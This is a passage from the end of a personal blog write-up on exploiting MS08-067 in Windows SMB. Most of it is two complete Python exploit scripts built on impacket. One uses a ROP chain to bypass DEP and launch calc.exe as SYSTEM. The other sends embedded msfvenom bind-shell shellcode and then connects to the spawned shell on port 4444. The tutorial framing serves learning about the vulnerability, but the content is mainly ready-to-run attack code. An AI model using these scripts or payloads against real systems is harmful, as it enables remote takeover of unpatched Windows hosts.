    addr_memcpy = p32(0x77c46f70)
    m_arg1_2 = p32(0) * 2
    m_arg3 = p32(0x180)

    fourth_sword = b''
    fourth_sword += b'\x90\x90'
    fourth_sword += b'\x90\x90\x90\x90'
    fourth_sword += b'\x90\x90\x90\x90'
    fourth_sword += rop1
    fourth_sword += rop2
    fourth_sword += b'B' * (0x8c - 4 * 19)
    fourth_sword += addr_writeprocessmemory
    fourth_sword += deadbeef
    fourth_sword += deadbeef
    fourth_sword += deadbeef
    fourth_sword += p32(0xffffffff)
    fourth_sword += p32(0x7c80220f + 0xbc)
    fourth_sword += p32(0xFFFFFEC7)
    fourth_sword += deadbeef
    fourth_sword += deadbeef
    fourth_sword += deadbeef
    fourth_sword += rop3
    fourth_sword += rop4
    fourth_sword += rop5
    fourth_sword += rop6

    data = (
        "ABCDEFGHIJ".encode('utf-16le') * 5 + 
        fourth_sword +
        padding_A +
        b'\x90' * 60 +
        shellcode +
        padding_A
    )

    path = (
        '\\'.encode('utf-16le') + 
        data +
        '\\..\\..\\'.encode('utf-16le') + 
        'ABCDEFG'.encode('utf-16le') + 
        exploit +
        b"\x00" * 2
    )

    #return

    if port == 445:
        trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
    else:
        trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % target, dstport=port, filename='\\browser')
    
    trans.connect()

    dce = trans.DCERPC_class(trans)
    dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
    
    server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
    prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
    
    count_value = len(path) // 2
    MaxCount = p32(count_value)
    Offset = b"\x00\x00\x00\x00"
    ActualCount = p32(count_value)

    stub = server + MaxCount + Offset + ActualCount + path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

    print(f'[*] Exploiting...')

    dce.call(0x1f, stub)
    time.sleep(3)

    print(f'[+] Done')

if __name__ == '__main__':
    main()
```

Unfortunately, due to the size limitation, I could only fit a `calc` shellcode into the available space. If you know a way to execute a larger shellcode within this limitation, please let me know!

Now, let’s try it out:

![⚠️ 图片托管失败](/images/2026-10-13-MS08067/21.png)

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/21.png)

Due to Session 0 Isolation, we cannot see the spawned window. However, Task Manager shows that `calc.exe` has successfully been spawned with `SYSTEM` privileges in Session 0!

Now, what if we don’t have to worry about DEP? Can we use a larger shellcode?

Absolutely! I also wrote an exploit script that uses a `shell_bind_tcp` shellcode:

```python
# exploit_no_nx.py

import struct
import time
import sys
import socket
import select
import argparse

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport

# msfvenom -p windows/shell_bind_tcp lport=4444 -b "\x00\x0a\x1a\x20\x0c\x0d\x09\x0b" EXIT_FUNC=THREAD -f python -v shellcode
shellcode =  b""
shellcode += b"\xb8\xd9\xeb\xb1\x11\xdb\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x53\x31\x42\x12\x83\xc2\x04"
shellcode += b"\x03\x9b\xe5\x53\xe4\xe7\x12\x11\x07\x17\xe3"
shellcode += b"\x76\x81\xf2\xd2\xb6\xf5\x77\x44\x07\x7d\xd5"
shellcode += b"\x69\xec\xd3\xcd\xfa\x80\xfb\xe2\x4b\x2e\xda"
shellcode += b"\xcd\x4c\x03\x1e\x4c\xcf\x5e\x73\xae\xee\x90"
shellcode += b"\x86\xaf\x37\xcc\x6b\xfd\xe0\x9a\xde\x11\x84"
shellcode += b"\xd7\xe2\x9a\xd6\xf6\x62\x7f\xae\xf9\x43\x2e"
shellcode += b"\xa4\xa3\x43\xd1\x69\xd8\xcd\xc9\x6e\xe5\x84"
shellcode += b"\x62\x44\x91\x16\xa2\x94\x5a\xb4\x8b\x18\xa9"
shellcode += b"\xc4\xcc\x9f\x52\xb3\x24\xdc\xef\xc4\xf3\x9e"
shellcode += b"\x2b\x40\xe7\x39\xbf\xf2\xc3\xb8\x6c\x64\x80"
shellcode += b"\xb7\xd9\xe2\xce\xdb\xdc\x27\x65\xe7\x55\xc6"
shellcode += b"\xa9\x61\x2d\xed\x6d\x29\xf5\x8c\x34\x97\x58"
shellcode += b"\xb0\x26\x78\x04\x14\x2d\x95\x51\x25\x6c\xf2"
shellcode += b"\x96\x04\x8e\x02\xb1\x1f\xfd\x30\x1e\xb4\x69"
shellcode += b"\x79\xd7\x12\x6e\x7e\xc2\xe3\xe0\x81\xed\x13"
shellcode += b"\x29\x46\xb9\x43\x41\x6f\xc2\x0f\x91\x90\x17"
shellcode += b"\xa5\x99\x37\xc8\xd8\x64\x87\xb8\x5c\xc6\x60"
shellcode += b"\xd3\x52\x39\x90\xdc\xb8\x52\x39\x21\x43\x4d"
shellcode += b"\xe6\xac\xa5\x07\x06\xf9\x7e\xbf\xe4\xde\xb6"
shellcode += b"\x58\x16\x35\xef\xce\x5f\x5f\x28\xf1\x5f\x75"
shellcode += b"\x1e\x65\xd4\x9a\x9a\x94\xeb\xb6\x8a\xc1\x7c"
shellcode += b"\x4c\x5b\xa0\x1d\x51\x76\x52\xbd\xc0\x1d\xa2"
shellcode += b"\xc8\xf8\x89\xf5\x9d\xcf\xc3\x93\x33\x69\x7a"
shellcode += b"\x81\xc9\xef\x45\x01\x16\xcc\x48\x88\xdb\x68"
shellcode += b"\x6f\x9a\x25\x70\x2b\xce\xf9\x27\xe5\xb8\xbf"
shellcode += b"\x91\x47\x12\x16\x4d\x0e\xf2\xef\xbd\x91\x84"
shellcode += b"\xef\xeb\x67\x68\x41\x42\x3e\x97\x6e\x02\xb6"
shellcode += b"\xe0\x92\xb2\x39\x3b\x17\xc2\x73\x61\x3e\x4b"
shellcode += b"\xda\xf0\x02\x16\xdd\x2f\x40\x2f\x5e\xc5\x39"
shellcode += b"\xd4\x7e\xac\x3c\x90\x38\x5d\x4d\x89\xac\x61"
shellcode += b"\xe2\xaa\xe4"

data_size = 78

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def get_first_jump() -> bytes:
    rop1 = b''
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'BBBB' # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AA'
    rop1 += p32(0x77c52916) # ADD ESP,10 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AA'
    rop1 += b'AAAA'
    rop1 += b'DD'
    rop1 += p32(0xDEADBEEF)
    rop1 += b'DD'
    #rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'EE'
    rop1 += p32(0x77c4e162) # ADD ESP,30 # POP EDX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'EE'
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'AAAA'
    rop1 += b'AAAA'
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'BBBB' # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += p32(0x77c4dbde) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

    exploit = b''
    exploit += b'A' * 4
    exploit += rop1
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def get_exploit() -> bytes:
    exploit = b''
    exploit += b'A' * 4
    exploit += struct.pack('<I', 0x771f1544) # call edx
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def do_connect(ip: str):
    shell_sock = None

    for attempt in range(10): # retry
        try:
            time.sleep(1)
            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_sock.settimeout(3)
            shell_sock.connect((ip, 4444))
            shell_sock.settimeout(None)
            print(f"\n[+] Pwned!\n")
            break
        except (socket.error, socket.timeout):
            if shell_sock:
                shell_sock.close()
            shell_sock = None
            sys.stdout.write(".")
            sys.stdout.flush()

    if not shell_sock:
        print("[-] Connection failed: Max retries reached.")
        sys.exit(1)

    print("[+] Interactive shell spawned below:\n")

    while True:
        read_list = [sys.stdin, shell_sock]
        read_sockets, _, _ = select.select(read_list, [], [])

        if sys.stdin in read_sockets:
            line = sys.stdin.readline()
            if not line:
                break
            shell_sock.sendall(line.encode())

        if shell_sock in read_sockets:
            data = shell_sock.recv(1024)
            if not data:
                print("\n[-] Connection closed by target.")
                break
            sys.stdout.write(data.decode(errors='ignore'))
            sys.stdout.flush()

def main():
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print('\nUsage: %s <target ip> <Port #>\n' % sys.argv[0])
        print('Example: python3 dos.py 192.168.1.1 445')
        sys.exit(1)

    exploit = get_first_jump()

    add_esp_10 = p32(0x77c515cf) # ADD ESP,10 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_14 = p32(0x77c4d230) # ADD ESP,14 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_1c = p32(0x77c51bbb) # ADD ESP,1C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_2c = p32(0x77c4d7e1) # ADD ESP,2C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

    jmp_esp = p32(0x77c72f85)

    sword = b''
    sword += b'\x90\x90'
    sword += b'\x90\x90\x90\x90'
    sword += b'\x90\x90\x90\x90'
    sword += jmp_esp

    data = (
        "ABCDEFGHIJ".encode('utf-16le') * 5 + 
        sword +
        b'\x90' * 61 +
        shellcode +
        b'AAAA'
    )

    path = (
        '\\'.encode('utf-16le') + 
        data +
        '\\..\\..\\'.encode('utf-16le') + 
        'ABCDEFG'.encode('utf-16le') + 
        exploit +
        b"\x00" * 2
    )

    if port == 445:
        trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
    else:
        trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % target, dstport=port, filename='\\browser')
    
    trans.connect()

    dce = trans.DCERPC_class(trans)
    dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
    
    server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
    prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
    
    count_value = len(path) // 2
    MaxCount = p32(count_value)
    Offset = b"\x00\x00\x00\x00"
    ActualCount = p32(count_value)

    stub = server + MaxCount + Offset + ActualCount + path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

    dce.call(0x1f, stub)
    time.sleep(3)

    do_connect(target)

if __name__ == '__main__':
    main()
```

![⚠️ 图片托管失败](https://iss4cf0ng.github.io/images/2026-10-13-MS08067/22.png)

As we can see, we have successfully established a shell connection!

## Conclusion

Well… there are so many things I want to say, but right now, I’m a bit speechless…

One reason is that I still can’t believe I managed to write an MS08-067 exploit script from scratch.

Another reason is that I’ve been feeling quite frustrated about some things in my life lately.

Anyway, if you’ve read both of these articles, I believe your understanding of MS08-067 is already beyond that of most people. At the very least, you should now be able to write the exploit script from scratch yourself!

## THANKS FOR READING!

I’m not in the best mood right now, sorry. So, let me share one of my old drawings instead!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2f877dda9b395073.jpg)
